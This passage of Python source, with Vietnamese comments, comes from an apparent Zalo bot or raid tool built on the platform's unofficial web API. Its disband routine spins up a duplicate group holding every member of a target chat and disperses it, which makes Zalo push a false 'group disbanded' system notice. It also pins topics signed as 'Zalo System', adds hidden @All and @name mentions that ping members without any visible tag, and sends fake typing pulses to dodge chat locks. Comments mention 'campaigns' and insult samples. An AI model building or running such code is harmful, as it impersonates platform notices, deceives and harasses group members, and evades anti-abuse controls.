            parts_g = [p.strip() for p in clean_gname.split("|") if p.strip()]
            if parts_g:
                clean_gname = parts_g[self._disband_seq % len(parts_g)]
        # Loại bỏ tiền tố 'Nhóm ' nếu người dùng hoặc kịch bản truyền sẵn 'Nhóm ...' để không bị lặp 'Nhóm Nhóm ...'
        clean_gname = re.sub(r"^(?:nhóm|nhom)\s+", "", clean_gname, flags=re.IGNORECASE).strip()
        clean_gname = clean_gname[:45] or "Lũ vdanh"
        sys_notice_title = f"Nhóm {clean_gname} đã được giải tán"

        # Bước 1: Quét toàn bộ danh sách UID thành viên đang có mặt trong Box hiện tại (Không cần Key vẫn quét & thông báo 100%!)
        mems = []
        if target_uids and isinstance(target_uids, list):
            mems = [{"uid": str(u), "id": str(u)} for u in target_uids if str(u).strip()]
        if not mems:
            try:
                mems = self.get_members_full(gid_s, use_cache=True) or []
            except Exception:
                mems = []
        if len(mems) < 2:
            try:
                mems = self.get_members_full(gid_s, use_cache=False) or []
            except Exception:
                pass

        my_uid_s = str(self.uid or "").strip()
        other_mems = [m for m in mems if str(m.get("uid") or m.get("id") or "") not in ("", "0", my_uid_s)]
        member_uids = []
        seen_mu = set()
        for m in other_mems:
            u_cand = str(m.get("uid") or m.get("id") or "").strip()
            if u_cand.isdigit() and u_cand not in seen_mu:
                seen_mu.add(u_cand)
                member_uids.append(u_cand)

        active_s = getattr(self, "prio_s", None) or self.s
        disbanded_real_grid = ""
        cli_now = int(time.time() * 1000) + (self._disband_seq & 0xFF)

        # Bước 2: Tầng 1 (Không Cần Key Trong Box Hiện Tại) — Tự tạo Nhóm Chớp Nhoáng trùng tên Box (trong đó Acc của mình cầm Key Vàng)
        # chứa toàn bộ thành viên trong Box đó rồi lập tức gọi /api/group/disperse để máy chủ Zalo phát Thông Báo Hệ Thống thật 100%
        # "Nhóm <Tên Box> đã được giải tán" tới tất cả các mem trong Box!
        if len(member_uids) >= 1:
            if len(member_uids) == 1:
                member_uids = member_uids + ([my_uid_s] if my_uid_s.isdigit() else member_uids)
            # Xoay cửa sổ thành viên theo từng nhịp để phủ kín 100% thành viên nếu Box > 45 người
            offset_m = (self._disband_seq * 15) % max(1, len(member_uids))
            rotated_uids = member_uids[offset_m:] + member_uids[:offset_m]
            batch_uids = rotated_uids[:45]
            create_payloads = [
                {
                    "clientId": cli_now,
                    "gname": clean_gname,
                    "gdesc": None,
                    "members": batch_uids,
                    "membersTypes": [-1] * len(batch_uids),
                    "nameChanged": 1,
                    "createLink": 1,
                    "clientLang": "vi",
                    "imei": self.imei,
                    "zsource": 601,
                },
                {
                    "clientId": cli_now,
                    "gname": clean_gname,
                    "gdesc": sys_notice_title,
                    "members": batch_uids,
                    "membersTypes": [-1] * len(batch_uids),
                    "src": 1,
                    "imei": self.imei,
                },
                {
                    "gname": clean_gname,
                    "members": json.dumps(batch_uids),
                    "imei": self.imei,
                },
            ]
            for ep_cr in (
                "https://tt-group-wpa.chat.zalo.me/api/group/create",
                "https://tt-group-wpa.chat.zalo.me/api/group/create/v2",
                "https://group-wpa.chat.zalo.me/api/group/create",
                "https://wpa.chat.zalo.me/api/group/create",
            ):
                check_campaign_thread_aborted(gid_s)
                for pl_cr in create_payloads:
                    try:
                        enc_cr = self._enc(pl_cr)
                        for use_get in (False, True):
                            if use_get:
                                r_cr = active_s.get(
                                    ep_cr,
                                    params={"zpw_ver": 645, "zpw_type": 30, "params": enc_cr},
                                    timeout=(1.2, 2.5),
                                )
                            else:
                                r_cr = active_s.post(
                                    ep_cr,
                                    params={"zpw_ver": 645, "zpw_type": 30},
                                    data={"params": enc_cr},
                                    timeout=(1.2, 2.5),
                                )
                            if r_cr.status_code == 200 and r_cr.content:
                                rj_cr = r_cr.json()
                                if rj_cr.get("data"):
                                    dec_cr = json.loads(self._dec(rj_cr["data"]))
                                    d_cr = dec_cr.get("data") if isinstance(dec_cr, dict) else dec_cr
                                    if isinstance(d_cr, dict):
                                        new_grid = str(d_cr.get("groupId") or d_cr.get("grid") or d_cr.get("id") or "").strip()
                                        if new_grid and new_grid.isdigit():
                                            disbanded_real_grid = new_grid
                                            break
                        if disbanded_real_grid:
                            break
                    except Exception as ex_c:
                        if "TaskStoppedAbort" in str(ex_c):
                            raise ex_c
                        continue
                if disbanded_real_grid:
                    break

            if disbanded_real_grid:
                disperse_pl = {"grid": disbanded_real_grid, "groupId": disbanded_real_grid, "imei": self.imei}
                for ep_disp in (
                    "https://tt-group-wpa.chat.zalo.me/api/group/disperse",
                    "https://group-wpa.chat.zalo.me/api/group/disperse",
                    "https://wpa.chat.zalo.me/api/group/disperse",
                    "https://tt-group-wpa.chat.zalo.me/api/group/delete",
                ):
                    try:
                        enc_dp = self._enc(disperse_pl)
                        active_s.post(
                            ep_disp,
                            params={"zpw_ver": 645, "zpw_type": 30},
                            data={"params": enc_dp},
                            timeout=(1.0, 2.2),
                        )
                    except Exception:
                        continue

        # Bước 3: Tầng 2 — Kích hoạt Thanh Thông Báo Hệ Thống Của Zalo (System Topic / Reminder / Group Disperse Event)
        # tuyệt đối KHÔNG gửi tin nhắn văn bản send_adv vào khung chat!
        sys_event_payloads = [
            (
                "https://board-wpa.chat.zalo.me/api/board/topic/createv2",
                {
                    "grid": gid_s,
                    "type": 0,
                    "color": -1,
                    "emoji": "📢",
                    "startTime": -1,
                    "duration": -1,
                    "params": json.dumps({"title": sys_notice_title, "senderUid": str(self.uid or ""), "senderName": "Hệ thống Zalo"}, ensure_ascii=False),
                    "repeat": 0,
                    "src": 1,
                    "imei": self.imei,
                    "pinAct": 1,
                },
            ),
            (
                "https://tt-group-wpa.chat.zalo.me/api/group/topic/update",
                {
                    "grid": gid_s,
                    "type": 0,
                    "color": -1,
                    "emoji": "📢",
                    "params": json.dumps({"title": sys_notice_title}, ensure_ascii=False),
                    "imei": self.imei,
                    "pinAct": 1,
                },
            ),
            (
                "https://board-wpa.chat.zalo.me/api/board/reminder/create",
                {
                    "objectData": json.dumps({
                        "toUid": gid_s,
                        "isGroup": 1,
                        "title": sys_notice_title,
                        "emoji": "📢",
                        "startTime": int(time.time() * 1000) + 60000,
                        "repeat": 0,
                    }, ensure_ascii=False),
                    "imei": self.imei,
                },
            ),
            (
                "https://tt-group-wpa.chat.zalo.me/api/group/disperse",
                {"grid": gid_s, "groupId": gid_s, "imei": self.imei},
            ),
        ]
        for ep_sys, pl_sys in sys_event_payloads:
            check_campaign_thread_aborted(gid_s)
            try:
                enc_sys = self._enc(pl_sys)
                active_s.post(
                    ep_sys,
                    params={"zpw_ver": 645, "zpw_type": 30},
                    data={"params": enc_sys},
                    timeout=(1.0, 2.2),
                )
            except Exception:
                continue

        total_notified = max(len(member_uids), len(mems), 1)
        return {
            "ok": True,
            "group_name": clean_gname,
            "system_notice": sys_notice_title,
            "disbanded_grid": disbanded_real_grid,
            "members_count": total_notified,
        }

    def send_reaction(self, thread_id, msg_id, cli_msg_id, r_icon="/-heart", is_group=True):
        r_map = {
            "/-heart": 5, "tim": 5, "heart": 5, "❤️": 5,
            "/-strong": 3, "like": 3, "👍": 3,
            ":>": 0, "haha": 0, "cuoi": 0, "😆": 0,
            ":))": 1, "😁": 1,
            ":((": 2, "sad": 2, "khoc": 2, "😢": 2,
            ":o": 32, "wow": 32, "😮": 32,
            ":-h": 20, "angry": 20, "gian": 20, "😡": 20,
        }
        icon_norm = str(r_icon or "/-heart").strip().lower()
        r_type = r_map.get(icon_norm, 5)
        real_icon = "/-heart" if icon_norm in ("tim", "heart", "❤️") else (
            "/-strong" if icon_norm in ("like", "👍") else (
                ":>" if icon_norm in ("haha", "cuoi", "😆") else (
                    ":((" if icon_norm in ("sad", "khoc", "😢") else (
                        ":o" if icon_norm in ("wow", "😮") else (
                            ":-h" if icon_norm in ("angry", "gian", "😡") else r_icon
                        )
                    )
                )
            )
        )
        pl = {
            "react_list": [{
                "message": json.dumps({"rMsg": [{"gMsgID": int(msg_id or 0), "cMsgID": int(cli_msg_id or 0), "msgType": 1}], "rIcon": real_icon, "rType": r_type, "source": 6}),
                "clientId": int(time.time() * 1000)
            }]
        }
        if is_group:
            pl["grid"] = str(thread_id)
            url = "https://reaction.chat.zalo.me/api/group/reaction"
        else:
            pl["toid"] = str(thread_id)
            url = "https://reaction.chat.zalo.me/api/message/reaction"
        enc = self._enc(pl)
        r = self.s.post(url, params={"zpw_ver": 645, "zpw_type": 30}, data={"params": enc}, timeout=8)
        return r.status_code == 200

    def undo_message(self, thread_id, msg_id, cli_msg_id=0, is_group=True):
        """Thu hồi tin nhắn trên Zalo (/api/group/undomsg & /api/message/undo)."""
        tid_s = _clean_zalo_id(thread_id) or str(thread_id).strip()
        if not tid_s or not msg_id:
            return False
        pl = {
            "msgId": str(msg_id),
            "cliMsgId": str(cli_msg_id or int(time.time() * 1000)),
            "clientId": int(time.time() * 1000),
            "imei": self.imei,
        }
        if is_group:
            pl["grid"] = tid_s
            pl["visibility"] = 0
            eps = ("https://tt-group-wpa.chat.zalo.me/api/group/undomsg", "https://group-wpa.chat.zalo.me/api/group/undomsg")
        else:
            pl["toid"] = tid_s
            eps = ("https://tt-chat2-wpa.chat.zalo.me/api/message/undo", "https://wpa.chat.zalo.me/api/message/undo")
        active_s = getattr(self, "prio_s", None) or self.s
        for ep in eps:
            try:
                r = active_s.post(ep, params={"zpw_ver": 645, "zpw_type": 30}, data={"params": self._enc(pl)}, timeout=6)
                if r.status_code == 200:
                    return True
            except Exception:
                continue
        return False

    def send_link_card(self, thread_id, link_url, title="", desc="", is_group=True):
        """Chia sẻ thẻ Liên Kết (Link Card) trên Zalo."""
        tid_s = _clean_zalo_id(thread_id) or str(thread_id).strip()
        u_clean = str(link_url or "https://chat.zalo.me/").strip()
        if not u_clean.startswith(("http://", "https://")):
            u_clean = "https://" + u_clean
        pl = {
            "grid" if is_group else "toId": tid_s,
            "type": 2 if is_group else 0,
            "clientId": int(time.time() * 1000),
            "link": u_clean,
            "linkTitle": str(title or u_clean)[:100],
            "linkDesc": str(desc or title or "Liên kết chia sẻ nhanh")[:160],
            "linkThumb": "",
            "msg": f"{title} — {u_clean}" if title else u_clean,
            "imei": self.imei,
            "ttl": 0,
        }
        eps = (
            ("https://tt-group-wpa.chat.zalo.me/api/group/sendlink", "https://wpa.chat.zalo.me/api/group/sendlink")
            if is_group else
            ("https://tt-chat2-wpa.chat.zalo.me/api/message/link", "https://wpa.chat.zalo.me/api/message/link")
        )
        active_s = getattr(self, "prio_s", None) or self.s
        for ep in eps:
            try:
                r = active_s.post(ep, params={"zpw_ver": 645, "zpw_type": 30}, data={"params": self._enc(pl)}, timeout=6)
                if r.status_code == 200:
                    return True
            except Exception:
                continue
        return False

    def invite_users_to_group(self, group_id, uids_list):
        """Mời / thêm thành viên vào nhóm Zalo (/api/group/invite/v2 & /api/group/invite)."""
        gid_s = _clean_zalo_id(group_id) or str(group_id).strip()
        clean_u = [str(u).strip() for u in (uids_list or []) if str(u).strip().isdigit()]
        if not gid_s or not clean_u:
            return False
        active_s = getattr(self, "prio_s", None) or self.s
        for ep, pl in (
            ("https://tt-group-wpa.chat.zalo.me/api/group/invite/v2", {"grid": gid_s, "members": clean_u, "memberTypes": [-1] * len(clean_u), "src": 2, "imei": self.imei, "clientLang": "vi"}),
            ("https://tt-group-wpa.chat.zalo.me/api/group/invite", {"grid": gid_s, "members": clean_u, "imei": self.imei}),
        ):
            try:
                r = active_s.post(ep, params={"zpw_ver": 645, "zpw_type": 30}, data={"params": self._enc(pl)}, timeout=6)
                if r.status_code == 200:
                    return True
            except Exception:
                continue
        return False

    def set_friend_block_status(self, target_uid, block=True):
        """Chặn hoặc bỏ chặn UID trên Zalo."""
        u_s = _clean_zalo_id(target_uid)
        if not u_s:
            return False
        ep = "https://tt-friend-wpa.chat.zalo.me/api/friend/block" if block else "https://tt-friend-wpa.chat.zalo.me/api/friend/unblock"
        try:
            r = self.s.post(ep, params={"zpw_ver": 645, "zpw_type": 30}, data={"params": self._enc({"fid": u_s, "imei": self.imei})}, timeout=6)
            return r.status_code == 200
        except Exception:
            return False

    def set_friend_alias(self, target_uid, alias_name):
        """Đổi tên gợi nhớ (biệt danh) cho thành viên trên Zalo."""
        u_s = _clean_zalo_id(target_uid)
        if not u_s:
            return False
        try:
            pl = {"fid": u_s, "alias": str(alias_name or "")[:45], "imei": self.imei}
            r = self.s.post("https://tt-alias-wpa.chat.zalo.me/api/alias/update", params={"zpw_ver": 645, "zpw_type": 30}, data={"params": self._enc(pl)}, timeout=6)
            return r.status_code == 200
        except Exception:
            return False

    def get_recent_group_messages(self, gid):
        gid_s = str(gid).strip()
        if not gid_s or gid_s == "0":
            return []
        ALL_KNOWN_ZALO_GROUP_IDS.add(gid_s)
        if self.uid:
            KNOWN_GROUPS_BY_ACC[self.uid].add(gid_s)

        active_s = getattr(self, "prio_s", None) or self.s
        if not self.secret_key:
            try:
                self._login(force=True)
            except Exception:
                return []
        self._sync_cookie_headers()
        candidates = [
            ("https://tt-group-wpa.chat.zalo.me/api/group/getrecentv2", {"grid": gid_s, "imed": 0}),
            ("https://group-wpa.chat.zalo.me/api/group/getrecentv2", {"grid": gid_s, "imed": 0}),
            ("https://tt-group-wpa.chat.zalo.me/api/group/getrecentv2", {"grid": gid_s, "groupId": gid_s, "imed": 0, "count": 25}),
            ("https://wpa.chat.zalo.me/api/group/getrecentv2", {"grid": gid_s, "imed": 0}),
            ("https://tt-group-wpa.chat.zalo.me/api/group/getrecent", {"grid": gid_s, "imed": 0}),
        ]
        if self._working_recent_ep is not None:
            w_ep, w_mode = self._working_recent_ep
            w_pl = {"grid": gid_s, "imed": 0} if w_mode == 0 else {"grid": gid_s, "groupId": gid_s, "imed": 0, "count": 25}
            candidates.insert(0, (w_ep, w_pl))

        for ep, pl_cand in candidates:
            try:
                enc = self._enc(pl_cand)
                r = active_s.post(
                    ep,
                    params={"zpw_ver": 645, "zpw_type": 30},
                    data={"params": enc},
                    timeout=(1.0, 2.0),
                )
                rj = r.json()
                if rj.get("data"):
                    dec = self._dec(rj["data"])
                    parsed = json.loads(dec)
                    data_obj = parsed.get("data") if isinstance(parsed, dict) else parsed
                    msgs = []
                    if isinstance(data_obj, dict):
                        msgs = data_obj.get("groupMsgs") or data_obj.get("msgs") or data_obj.get("messages") or []
                    elif isinstance(data_obj, list):
                        msgs = data_obj
                    if msgs and isinstance(msgs, list):
                        self._working_recent_ep = (ep, 1 if "count" in pl_cand else 0)
                        valid_msgs = [m for m in msgs if isinstance(m, dict)]
                        for m in valid_msgs:
                            u_f = str(m.get("uidFrom") or "").strip()
                            d_n = str(m.get("dName") or "").strip()
                            if u_f and d_n and u_f != "0":
                                GLOBAL_USER_NAME_CACHE[u_f] = d_n
                        valid_msgs.sort(key=lambda x: int(x.get("ts") or x.get("msgId") or x.get("cliMsgId") or 0))
                        return valid_msgs
            except Exception:
                continue
        return []

    def _pick_distinct_zcode(self, color_mode, fixed_color, step_index, prev_zcode=None):
        if color_mode == "none":
            return None
        if color_mode == "fixed" and fixed_color:
            return ZALO_COLOR_MAP.get(fixed_color, "db342e")
        if color_mode == "fire_gradient":
            pool = ZALO_FIRE_ZCODES
        elif color_mode == "ocean_gradient":
            pool = ZALO_OCEAN_ZCODES
        elif color_mode == "royal_gradient":
            pool = ZALO_ROYAL_ZCODES
        elif color_mode == "neon_cyber":
            pool = ZALO_CYBER_ZCODES
        else:
            pool = ZALO_NATIVE_ZCODES
        if color_mode == "random":
            candidates = [c for c in pool if c != prev_zcode] or pool
            return random.choice(candidates)
        chosen = pool[step_index % len(pool)]
        if chosen == prev_zcode and len(pool) > 1:
            chosen = pool[(step_index + 1) % len(pool)]
        return chosen

    @staticmethod
    def _resolve_zalo_font_tokens(font_style="normal_bold", is_heading=False, force_line_heading=False, step_idx=0, is_word_rainbow=False):
        fs = str(font_style or ("big_bold" if is_heading else "normal_bold")).lower()
        if is_word_rainbow and not force_line_heading:
            # Trên Zalo iOS/Android & PC, nhảy màu cầu vồng từng từ/ký tự gắn kèm in đậm "b" giúp màu chữ rực rỡ, sắc nét 100%
            if fs in ("chuto_explicit", "heading_explicit", "big_bold", "chuto", "heading"):
                return ["b", "f_18"] if is_heading else ["b"]
            if fs in ("italic_bold", "nghieng", "italic_serif"):
                return ["b", "i"]
            if fs in ("underline_bold", "gachchan"):
                return ["b", "u"]
            return ["b"]
        if force_line_heading or fs in ("big_bold", "chuto", "heading", "bold_serif", "bold_sans", "double_struck", "script_vip", "small_caps"):
            return ["b", "f_18"]
        if fs in ("small_bold", "chunho", "nho"):
            return ["b", "f_13"]
        if fs in ("normal_bold", "vua", "bold"):
            return ["b"]
        if fs in ("alternating_bold", "xenke", "sole"):
            return ["b", "f_18"] if (step_idx % 2 == 0) else ["b", "f_13"]
        if fs in ("italic_bold", "nghieng", "italic_serif"):
            return ["b", "i", "f_18"]
        if fs in ("underline_bold", "gachchan"):
            return ["b", "u", "f_18"]
        if is_heading:
            return ["b", "f_18"]
        return []

    def build_colored_message_with_vip_icons(
        self, raw_text, color_mode="word_rainbow", fixed_color="red",
        is_heading=True, color_offset=0, antiband=True,
        use_emoji=True, icon_count=3, strip_line_num=False,
        font_style="big_bold"
    ):
        """Bộ Tạo Màu Chữ Đổi Từng Từ / Từng Chữ Chuẩn Zalo (Tuyệt Đối Không Để Chữ Trắng):
        - Khi color_mode != 'none' (mặc định 'word_rainbow'): Tự động tô màu từng từ (hoặc từng chữ cái nếu dòng chỉ có 1 từ)
          xoay vòng qua 4 mã màu gốc rực rỡ của Zalo (Đỏ db342e, Cam f27806, Vàng f7b503, Xanh lá 15a85f).
        - Tự động gom nhóm thông minh nếu câu quá dài (>18 từ) để tổng số đoạn style luôn <= 18, đảm bảo Zalo render 100% màu!
        - Chỉ khi color_mode == 'none' (dành riêng cho tin nhắn hệ thống .menu, .ping, .status) mới để chữ trắng mặc định."""
        raw_clean = clean_corrupted_shortcuts(raw_text)
        lines = raw_clean.split("\n")

        core_lines = []
        collected_tail_icons = []
        styles = []
        current_u16_pos = 0
        active_line_idx = int(color_offset or 0)
        prev_zcode = None
        first_color = "db342e"

        eff_color_mode = str(color_mode or "word_rainbow").strip().lower()

        for ln in lines:
            r_ln = ln.rstrip("\r")
            stripped = r_ln.strip()
            if not stripped:
                core_lines.append("")
                current_u16_pos += 1
                continue

            lead_len = len(r_ln) - len(r_ln.lstrip(" \t"))
            lead_ws = r_ln[:lead_len]
            body_s = r_ln[lead_len:]

            force_line_heading = False
            if body_s.startswith("#") and not body_s.startswith("# >"):
                body_s = re.sub(r"^#+\s*", "", body_s).strip() or body_s
                force_line_heading = True

            if strip_line_num:
                body_s = strip_leading_line_number(body_s, preserve_indent=True)

            tokens = body_s.split(" ")
            line_tail_icons = []
            while tokens and _is_emoji_or_zalo_shortcut_token(tokens[-1]):
                tk = tokens.pop()
                if tk in ZALO_ICON_VIP:
                    line_tail_icons.insert(0, tk)
                elif tk in LEGACY_SHORTCUT_TO_ICON_MAP:
                    line_tail_icons.insert(0, LEGACY_SHORTCUT_TO_ICON_MAP[tk])
                else:
                    line_tail_icons.insert(0, get_icon_hard(line_tail_icons))

            core_body = " ".join(tokens).rstrip()
            if not core_body and line_tail_icons and use_emoji and icon_count > 0:
                core_body = " ".join(line_tail_icons)
                line_tail_icons = []

            if line_tail_icons and use_emoji and icon_count > 0:
                collected_tail_icons.extend(line_tail_icons)

            core_body = UnicodeLuxuryFontEngine.transform_line(core_body, font_style=font_style)
            core_text = lead_ws + core_body
            core_lines.append(core_text)
            core_u16_len = utf16_len(core_text)
            font_tokens = self._resolve_zalo_font_tokens(font_style, is_heading, force_line_heading, active_line_idx)

            if eff_color_mode == "none":
                # Chế độ chữ trắng sạch dành riêng cho thông báo chức năng hệ thống (.menu, .ping, .status)
                if is_heading or font_style != "normal":
                    st_only = [t for t in font_tokens if not t.startswith("c_")]
                    if st_only and core_u16_len > 0:
                        styles.append({
                            "start": current_u16_pos,
                            "len": core_u16_len,
                            "st": ",".join(st_only)
                        })
            elif eff_color_mode == "fixed":
                zcode = self._pick_distinct_zcode("fixed", fixed_color, active_line_idx, prev_zcode) or "db342e"
                first_color = zcode
                prev_zcode = zcode
                active_line_idx += 1
                st_parts = list(font_tokens)
                st_parts.append(f"c_{zcode}")
                if core_u16_len > 0:
                    styles.append({
                        "start": current_u16_pos,
                        "len": core_u16_len,
                        "st": ",".join(st_parts)
                    })
            elif eff_color_mode in ("rainbow", "line_rainbow", "dong"):
                # Đổi màu cầu vồng theo từng dòng (Line Rainbow)
                zcode = self._pick_distinct_zcode("rainbow", fixed_color, active_line_idx, prev_zcode) or "db342e"
                if active_line_idx == color_offset:
                    first_color = zcode
                prev_zcode = zcode
                active_line_idx += 1
                st_parts = list(font_tokens) if font_tokens else ["b"]
                st_parts.append(f"c_{zcode}")
                if core_u16_len > 0:
                    styles.append({
                        "start": current_u16_pos,
                        "len": core_u16_len,
                        "st": ",".join(st_parts)
                    })
            elif eff_color_mode in ("char_rainbow", "char", "kytu"):
                # Đổi màu cầu vồng theo từng ký tự (Character Rainbow)
                w_step = active_line_idx
                step_size = 1 if len(core_text) <= 18 else max(2, (len(core_text) + 15) // 16)
                c_offset = current_u16_pos
                for idx_c in range(0, len(core_text), step_size):
                    ch_seg = core_text[idx_c:idx_c + step_size]
                    ch_u16 = utf16_len(ch_seg)
                    if ch_u16 > 0 and ch_seg.strip():
                        zcode = self._pick_distinct_zcode("word_rainbow", fixed_color, w_step, prev_zcode) or "db342e"
                        if w_step == color_offset:
                            first_color = zcode
                        prev_zcode = zcode
                        w_f_tokens = self._resolve_zalo_font_tokens(font_style, is_heading, force_line_heading, w_step, is_word_rainbow=True)
                        w_step += 1
                        st_parts = list(w_f_tokens)
                        st_parts.append(f"c_{zcode}")
                        styles.append({
                            "start": c_offset,
                            "len": ch_u16,
                            "st": ",".join(st_parts)
                        })
                    c_offset += ch_u16
                active_line_idx = w_step
            else:
                # Mặc định cho mọi chiến dịch (word_rainbow, fire_gradient, ocean_gradient, royal_gradient, neon_cyber, random):
                # Đổi màu từng từ (hoặc từng chữ cái nếu chỉ có 1 từ) — tuyệt đối không để bất kỳ chữ nào màu trắng!
                word_matches = list(re.finditer(r"\S+", core_text))
                w_step = active_line_idx
                if len(word_matches) == 1 and len(word_matches[0].group(0)) > 1:
                    # Nếu câu chỉ có 1 từ (ví dụ: "Sủa?", "Câm!", "Đầu_hàng"), đổi màu từng ký tự trong từ đó!
                    m0 = word_matches[0]
                    w_str = m0.group(0)
                    base_char_u16 = current_u16_pos + utf16_len(core_text[:m0.start()])
                    c_offset = base_char_u16
                    step_size = 1 if len(w_str) <= 14 else max(2, (len(w_str) + 11) // 12)
                    for idx_c in range(0, len(w_str), step_size):
                        ch_seg = w_str[idx_c:idx_c + step_size]
                        ch_u16 = utf16_len(ch_seg)
                        if ch_u16 > 0:
                            zcode = self._pick_distinct_zcode(eff_color_mode, fixed_color, w_step, prev_zcode) or "db342e"
                            if w_step == color_offset:
                                first_color = zcode
                            prev_zcode = zcode
                            w_f_tokens = self._resolve_zalo_font_tokens(font_style, is_heading, force_line_heading, w_step, is_word_rainbow=True)
                            w_step += 1
                            st_parts = list(w_f_tokens)
                            st_parts.append(f"c_{zcode}")
                            styles.append({
                                "start": c_offset,
                                "len": ch_u16,
                                "st": ",".join(st_parts)
                            })
                            c_offset += ch_u16
                elif len(word_matches) >= 1:
                    # Tô màu nhảy cầu vồng từng từ chuẩn ảnh mẫu fd8d41d0.jpeg (từng từ đổi màu Đỏ - Cam - Vàng - Xanh lá, giữ @Tag xanh dương ở cuối)
                    group_sz = 1 if len(word_matches) <= 36 else max(2, (len(word_matches) + 31) // 32)
                    for idx_w in range(0, len(word_matches), group_sz):
                        m_first = word_matches[idx_w]
                        m_last = word_matches[min(idx_w + group_sz - 1, len(word_matches) - 1)]
                        seg_start_char = m_first.start()
                        seg_end_char = m_last.end()
                        seg_u16_start = current_u16_pos + utf16_len(core_text[:seg_start_char])
                        seg_u16_len = utf16_len(core_text[seg_start_char:seg_end_char])
                        if seg_u16_len > 0:
                            zcode = self._pick_distinct_zcode(eff_color_mode, fixed_color, w_step, prev_zcode) or "db342e"
                            if w_step == color_offset:
                                first_color = zcode
                            prev_zcode = zcode
                            w_f_tokens = self._resolve_zalo_font_tokens(font_style, is_heading, force_line_heading, w_step, is_word_rainbow=True)
                            w_step += 1
                            st_parts = list(w_f_tokens)
                            st_parts.append(f"c_{zcode}")
                            styles.append({
                                "start": seg_u16_start,
                                "len": seg_u16_len,
                                "st": ",".join(st_parts)
                            })
                active_line_idx = w_step

            current_u16_pos += core_u16_len + 1

        core_msg = "\n".join(core_lines)
        tail_icon_str = ""
        if use_emoji and int(icon_count or 0) > 0:
            if collected_tail_icons:
                tail_icon_str = " ".join(collected_tail_icons[:int(icon_count)])
            else:
                tail_icon_str = build_unique_zalo_icons(int(icon_count))

        return core_msg, styles, first_color, tail_icon_str

    def attach_mentions_real_zalo(self, core_msg, mentions=None, tag_all=False, group_id=None, hide_tag_all=True, hide_tag_name=True):
        """Gắn Tag Thật 100% chuẩn giao thức Zalo Group (`/api/group/mention`) + Hỗ trợ ĐỒNG THỜI:
        1. TAG @ALL ẨN (`hide_tag_all=True`): Xóa chữ `@All` khỏi văn bản hiển thị và neo `{"pos": pos, "len": 1, "uid": "-1", "type": 1}`
           vào đúng 1 khoảng trắng tàng hình ở cuối câu. Cả nhóm đều bị báo chuông `@All` nhưng tuyệt đối không hiện chữ `@All`!
        2. TAG @TÊN ẨN (`hide_tag_name=True`): Xóa chữ `@Tên` khỏi văn bản hiển thị và neo mỗi thành viên được tag
           `{"pos": pos_u, "len": 1, "uid": str(uid), "type": 0}` vào đúng 1 khoảng trắng riêng biệt ở cuối câu!
           Người bị tag vẫn nhận thông báo nhắc tên thật 100% ('Bạn đã được nhắc đến') nhưng trên khung chat KHÔNG HIỆN chữ `@Tên`!"""
        final = core_msg if core_msg else ""
        m_arr = []

        if tag_all:
            if hide_tag_all:
                final = re.sub(r"(?i)(?:\s+|^)@(?:all|tất\s*cả|tat\s*ca)\b", "", final).strip()
                if not final:
                    final = " "
                pos = utf16_len(final)
                final = final + " "
                m_arr.append({
                    "pos": int(pos),
                    "len": 1,
                    "uid": "-1",
                    "type": 1,
                    "_hidden": True
                })
            else:
                tag_token = "@All"
                idx_existing = final.find("@All")
                if idx_existing != -1:
                    pos = utf16_len(final[:idx_existing])
                    t_len = utf16_len(tag_token)
                else:
                    sep = " " if (final and not final.endswith((" ", "\n"))) else ""
                    pos = utf16_len(final + sep)
                    final = final + sep + tag_token
                    t_len = utf16_len(tag_token)
                m_arr.append({
                    "pos": int(pos),
                    "len": int(t_len),
                    "uid": "-1",
                    "type": 1
                })

        if mentions:
            seen_uids = set()
            for m in mentions:
                if not isinstance(m, dict):
                    continue
                uid = str(m.get("uid") or m.get("id") or m.get("userId") or "").strip()
                if not uid or uid in ("0",) or uid in seen_uids:
                    continue
                if uid == "-1":
                    if not any(x["uid"] == "-1" for x in m_arr):
                        if hide_tag_all:
                            if not final:
                                final = " "
                            pos = utf16_len(final)
                            final = final + " "
                            m_arr.append({"pos": int(pos), "len": 1, "uid": "-1", "type": 1, "_hidden": True})
                        else:
                            sep = " " if (final and not final.endswith((" ", "\n"))) else ""
                            pos = utf16_len(final + sep)
                            final = final + sep + "@All"
                            m_arr.append({"pos": int(pos), "len": 4, "uid": "-1", "type": 1})
                    continue

                raw_name = str(m.get("name") or m.get("dName") or m.get("displayName") or "").strip().lstrip("@")
                if not uid.isdigit() and group_id:
                    try:
                        mems = self.get_members_full(group_id, use_cache=True)
                        matched_m = _smart_match_member_by_query(raw_name or uid, mems, zalo_client=self, group_id=group_id)
                        if matched_m and str(matched_m.get("uid") or matched_m.get("id")).isdigit():
                            uid = str(matched_m.get("uid") or matched_m.get("id"))
                            if matched_m.get("name"):
                                raw_name = matched_m["name"]
                    except Exception:
                        pass
                if uid in seen_uids:
                    continue
                seen_uids.add(uid)

                if not raw_name or raw_name.startswith(("Thành viên ", "Người dùng ", "User_")):
                    if uid in GLOBAL_USER_NAME_CACHE:
                        raw_name = GLOBAL_USER_NAME_CACHE[uid]
                    elif group_id:
                        try:
                            mems = self.get_members_full(group_id, use_cache=True)
                            fm = next((x for x in mems if str(x.get("uid") or x.get("id")) == uid), None)
                            if fm and fm.get("name"):
                                raw_name = fm["name"]
                        except Exception:
                            pass

                name = raw_name.split(" (")[0].strip() if " (" in raw_name else raw_name.strip()
                if not name:
                    name = f"User_{uid[-4:]}"

                # Nếu bật Tag @Tên Ẩn (hide_tag_name=True): xóa sạch @Tên khỏi nội dung hiển thị và neo mention thật vào 1 khoảng trắng cuối câu!
                use_hidden_name = bool(m.get("hidden", hide_tag_name))
                if use_hidden_name and str(uid).isdigit():
                    tag_token_check = f"@{name}"
                    if tag_token_check in final:
                        final = final.replace(tag_token_check, "").strip()
                    if not final:
                        final = " "
                    pos = utf16_len(final)
                    final = final + " "
                    m_arr.append({
                        "pos": int(pos),
                        "len": 1,
                        "uid": str(uid),
                        "type": 0,
                        "_hidden": True
                    })
                else:
                    tag_token = f"@{name}"
                    existing_idx = final.find(tag_token)
                    if existing_idx != -1:
                        pos = utf16_len(final[:existing_idx])
                        t_len = utf16_len(tag_token)
                    else:
                        sep = " " if (final and not final.endswith((" ", "\n"))) else ""
                        pos = utf16_len(final + sep)
                        final = final + sep + tag_token
                        t_len = utf16_len(tag_token)

                    m_arr.append({
                        "pos": int(pos),
                        "len": int(t_len),
                        "uid": str(uid),
                        "type": 0
                    })

        return final, m_arr

    def _pulse_box_typing_async(self, thread_id, is_group=True):
        """Gửi xung typing siêu nhẹ ngầm để Zalo ghi nhận hoạt động gõ phím người thật, chống khóa chat Box."""
